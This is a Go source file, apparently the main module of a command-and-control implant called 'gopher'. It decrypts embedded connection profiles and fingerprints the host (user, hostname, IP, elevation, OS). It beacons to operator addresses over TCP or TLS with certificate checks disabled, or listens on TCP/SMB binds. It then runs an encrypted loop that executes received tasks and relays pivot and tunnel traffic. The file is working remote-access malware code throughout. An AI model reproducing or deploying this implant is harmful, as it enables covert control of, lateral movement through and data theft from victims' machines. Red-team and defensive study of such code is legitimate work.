package main

import (
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"errors"
	"gopher/functions"
	"gopher/utils"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

var ACTIVE = true
var PIVOTTER = NewPivotter()

var WakeupChan = make(chan struct{}, 1)

func buildFlushPayload(sessionKey []byte, pivotBacklog, tunnelBacklog *[][]byte, lastUnsent utils.Message) ([]byte, error) {
	var objects [][]byte
	if lastUnsent.Type == 1 && len(lastUnsent.Object) > 0 {
		objects = append(objects, lastUnsent.Object...)
	}
	pivotResults := PIVOTTER.ProcessPivots()
	if len(*pivotBacklog) > 0 {
		pivotResults = append(*pivotBacklog, pivotResults...)
		*pivotBacklog = (*pivotBacklog)[:0]
	}
	if len(pivotResults) > 0 {
		objects = append(objects, pivotResults...)
	}
	tun := collectTunnelData()
	if len(*tunnelBacklog) > 0 {
		tun = append(*tunnelBacklog, tun...)
		*tunnelBacklog = (*tunnelBacklog)[:0]
	}
	if len(tun) > 0 {
		objects = append(objects, tun...)
	}
	if len(objects) == 0 {
		return nil, nil
	}
	out := utils.Message{Type: 1, Object: objects}
	sendData, err := msgpack.Marshal(out)
	if err != nil {
		return nil, err
	}
	return utils.EncryptData(sendData, sessionKey)
}

func flushExchangeTeardown(conn net.Conn, sessionKey []byte, pivotBacklog, tunnelBacklog *[][]byte, lastUnsent utils.Message, send func([]byte) error) {
	if conn == nil {
		return
	}
	payload, err := buildFlushPayload(sessionKey, pivotBacklog, tunnelBacklog, lastUnsent)
	if err != nil {
		return
	}
	if len(payload) == 0 {
		return
	}
	if err := send(payload); err != nil {
	}
}

func CreateInfo() ([]byte, []byte) {
	var (
		addr     []net.Addr
		username string
		ip       string
	)

	path, err := os.Executable()
	if err == nil {
		path = filepath.Base(path)
	}

	userCurrent, err := user.Current()
	if err == nil {
		username = userCurrent.Username
	}

	host, _ := os.Hostname()

	osVersion, _ := functions.GetOsVersion()

	addr, err = net.InterfaceAddrs()
	if err == nil {
		for _, a := range addr {
			ipnet, ok := a.(*net.IPNet)
			if ok && !ipnet.IP.IsLoopback() && !ipnet.IP.IsLinkLocalUnicast() && ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}

	acp, oemcp := functions.GetCP()

	randKey := make([]byte, 16)
	_, _ = rand.Read(randKey)

	info := utils.SessionInfo{
		Process:    path,
		PID:        os.Getpid(),
		User:       username,
		Host:       host,
		Ipaddr:     ip,
		Elevated:   functions.IsElevated(),
		Acp:        acp,
		Oem:        oemcp,
		Os:         runtime.GOOS,
		OSVersion:  osVersion,
		EncryptKey: randKey,
	}

	data, _ := msgpack.Marshal(info)

	return data, randKey
}

var profiles []utils.Profile
var encKeys [][]byte
var profileIndex int
var profile utils.Profile
var AgentId uint32
var encKey []byte

func main() {
	agentMain()
}

func agentMain() {

	for _, encProfile := range encProfiles {
		key := make([]byte, 16)
		copy(key, encProfile[:16])
		encData := encProfile[16:]
		decData, err := utils.DecryptData(encData, key)
		if err != nil {
			continue
		}

		var p utils.Profile
		err = msgpack.Unmarshal(decData, &p)
		if err != nil {
			continue
		}

		profiles = append(profiles, p)
		encKeys = append(encKeys, key)
	}

	if len(profiles) == 0 {
		return
	}

	profileIndex = 0
	profile = profiles[profileIndex]
	encKey = encKeys[profileIndex]

	sessionInfo, sessionKey := CreateInfo()
	utils.SKey = sessionKey

	r := make([]byte, 4)
	_, _ = rand.Read(r)
	AgentId = binary.BigEndian.Uint32(r)

	UPLOADS = make(map[string][]byte)
	DOWNLOADS = make(map[string]utils.Connection)
	JOBS = make(map[string]utils.Connection)

	switch profile.Protocol {
	case "bind_tcp":
		runBindTCP(sessionInfo, sessionKey, encKey)
	case "bind_smb":
		runBindSMB(sessionInfo, sessionKey, encKey)
	default:
		initData, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
		initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
		initMsg, _ = utils.EncryptData(initMsg, encKey)
		runConnectTCP(sessionInfo, sessionKey, encKey, initMsg)
	}
}

func runConnectTCP(sessionInfo []byte, sessionKey []byte, encKey []byte, initMsg []byte) {
	addrIndex := 0
	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
		if i > 0 {
			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
			addrIndex++
			if addrIndex >= len(profile.Addresses) {
				addrIndex = 0
				profileIndex = (profileIndex + 1) % len(profiles)
				profile = profiles[profileIndex]
				encKey = encKeys[profileIndex]
				id, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
				initMsg, _ = msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: id})
				initMsg, _ = utils.EncryptData(initMsg, encKey)
			}
		}

		var (
			err  error
			conn net.Conn
		)

		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				continue
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			conn, err = tls.Dial("tcp", profile.Addresses[addrIndex], config)

		} else {
			conn, err = net.Dial("tcp", profile.Addresses[addrIndex])
		}
		if err != nil {
			continue
		} else {
			i = 0
		}

		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				conn.Close()
				continue
			}
		}

		if err := functions.SendMsg(conn, initMsg); err != nil {
			conn.Close()
			continue
		}

		exchangeLoop(conn, sessionKey)
		conn.Close()
	}
}

func runBindTCP(sessionInfo []byte, sessionKey []byte, encKey []byte) {
	if len(profile.Addresses) == 0 {
		return
	}
	bindAddr := profile.Addresses[0]

	listener, err := net.Listen("tcp", bindAddr)
	if err != nil {
		return
	}
	defer listener.Close()

	beatPayload, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.AgentType, Data: sessionInfo})
	beatPayload, _ = utils.EncryptData(beatPayload, encKey)

	watermark := make([]byte, 4)
	binary.LittleEndian.PutUint32(watermark, uint32(profile.Type))
	beat := append(watermark, beatPayload...)

	for ACTIVE {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		hdr := make([]byte, 4)
		binary.LittleEndian.PutUint32(hdr, uint32(len(beat)))
		if err := functions.WriteFull(conn, hdr); err != nil {
			conn.Close()
			continue
		}
		if err := functions.WriteFull(conn, beat); err != nil {
			conn.Close()
			continue
		}

		exchangeLoopLE(conn, sessionKey)
		conn.Close()
	}
}

func exchangeLoop(conn net.Conn, sessionKey []byte) {
	var (
		inMessage     utils.Message
		outMessage    utils.Message
		lastUnsent    utils.Message
		recvData      []byte
		sendData      []byte
		err           error
		pivotBacklog  [][]byte
		tunnelBacklog [][]byte
	)

	defer func() {
		pending := outMessage
		if lastUnsent.Type == 1 && len(lastUnsent.Object) > 0 {
			pending = lastUnsent
		}
		flushExchangeTeardown(conn, sessionKey, &pivotBacklog, &tunnelBacklog, pending, func(p []byte) error {
			return functions.SendMsg(conn, p)
		})
	}()

	const tcpPoll = 100 * time.Millisecond

	for ACTIVE {
		recvData, err = functions.RecvMsgPoll(conn, tcpPoll)
		if err != nil {
			if errors.Is(err, functions.ErrRecvMsgPollTimeout) {
				if PIVOTTER.HasActivePivots() {
					pivotBacklog = append(pivotBacklog, PIVOTTER.ProcessPivots()...)
				}
				tunnelBacklog = append(tunnelBacklog, collectTunnelData()...)
				continue
			}
			break
		}

		outMessage = utils.Message{Type: 0}
		recvData, err = utils.DecryptData(recvData, sessionKey)
		if err != nil {
			break
		}

		err = msgpack.Unmarshal(recvData, &inMessage)
		if err != nil {
			break
		}
		if len(inMessage.Object) > 0 {
		}

		if inMessage.Type == 1 {
			outMessage.Type = 1
			outMessage.Object = TaskProcess(inMessage.Object)
		}

		pivotResults := PIVOTTER.ProcessPivots()
		if len(pivotBacklog) > 0 {
			pivotResults = append(pivotBacklog, pivotResults...)
			pivotBacklog = pivotBacklog[:0]
		}
		if len(pivotResults) > 0 {
			outMessage.Type = 1
			outMessage.Object = append(outMessage.Object, pivotResults...)
		}

		tunnelResults := collectTunnelData()
		if len(tunnelBacklog) > 0 {
			tunnelResults = append(tunnelBacklog, tunnelResults...)
			tunnelBacklog = tunnelBacklog[:0]
		}
		if len(tunnelResults) > 0 {
			outMessage.Type = 1
			outMessage.Object = append(outMessage.Object, tunnelResults...)
		}

		sendData, err = msgpack.Marshal(outMessage)
		if err != nil {
			lastUnsent = outMessage
			break
		}
		sendData, err = utils.EncryptData(sendData, sessionKey)
		if err != nil {
			lastUnsent = outMessage
			break
		}
		if len(inMessage.Object) > 0 || len(outMessage.Object) > 0 {
		}
		if err = functions.SendMsg(conn, sendData); err != nil {
			lastUnsent = outMessage
			break
		}
		lastUnsent = utils.Message{Type: 0}
		outMessage = utils.Message{Type: 0}
	}
}

func exchangeLoopLE(conn net.Conn, sessionKey []byte) {
	var (
		inMessage     utils.Message
		outMessage    utils.Message
		lastUnsent    utils.Message
		recvData      []byte
		sendData      []byte
		err           error
		pivotBacklog  [][]byte
		tunnelBacklog [][]byte
	)

	defer func() {
		pending := outMessage
		if lastUnsent.Type == 1 && len(lastUnsent.Object) > 0 {
			pending = lastUnsent
		}
		flushExchangeTeardown(conn, sessionKey, &pivotBacklog, &tunnelBacklog, pending, func(p []byte) error {
			return pivotSendFrame(conn, p)
		})
	}()

	for ACTIVE {
		recvData, err = pivotRecvFrame(conn, 100*time.Millisecond)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				if PIVOTTER.HasActivePivots() {
					pivotBacklog = append(pivotBacklog, PIVOTTER.ProcessPivots()...)
				}
				tunnelBacklog = append(tunnelBacklog, collectTunnelData()...)
				continue
			}
			break
		}

		outMessage = utils.Message{Type: 0}
		recvData, err = utils.DecryptData(recvData, sessionKey)
		if err != nil {
			break
		}
		err = msgpack.Unmarshal(recvData, &inMessage)
		if err != nil {
			break
		}
		if len(inMessage.Object) > 0 {
		}

		if inMessage.Type == 1 {
			outMessage.Type = 1
			outMessage.Object = TaskProcess(inMessage.Object)
			if len(inMessage.Object) > 0 {
			}
		} else if len(inMessage.Object) > 0 {
			outMessage.Type = 1
			outMessage.Object = TaskProcess(inMessage.Object)
		}

		pivotResults := PIVOTTER.ProcessPivots()
		if len(pivotBacklog) > 0 {
			pivotResults = append(pivotBacklog, pivotResults...)
			pivotBacklog = pivotBacklog[:0]
		}
		if len(pivotResults) > 0 {
			outMessage.Type = 1
			outMessage.Object = append(outMessage.Object, pivotResults...)
		}

		tunnelResults := collectTunnelData()
		if len(tunnelBacklog) > 0 {
			tunnelResults = append(tunnelBacklog, tunnelResults...)
			tunnelBacklog = tunnelBacklog[:0]
		}
		if len(tunnelResults) > 0 {
			outMessage.Type = 1
			outMessage.Object = append(outMessage.Object, tunnelResults...)
		}

		sendData, err = msgpack.Marshal(outMessage)
		if err != nil {
			lastUnsent = outMessage
			break
		}
		sendData, err = utils.EncryptData(sendData, sessionKey)
		if err != nil {
			lastUnsent = outMessage
			break
		}
		if len(inMessage.Object) > 0 || len(outMessage.Object) > 0 {
		}
		err = pivotSendFrame(conn, sendData)
		if err != nil {
			lastUnsent = outMessage
			break
		}
		lastUnsent = utils.Message{Type: 0}
		outMessage = utils.Message{Type: 0}
	}
}

func SignalWakeup() {
	select {
	case WakeupChan <- struct{}{}:
	default:
	}
}
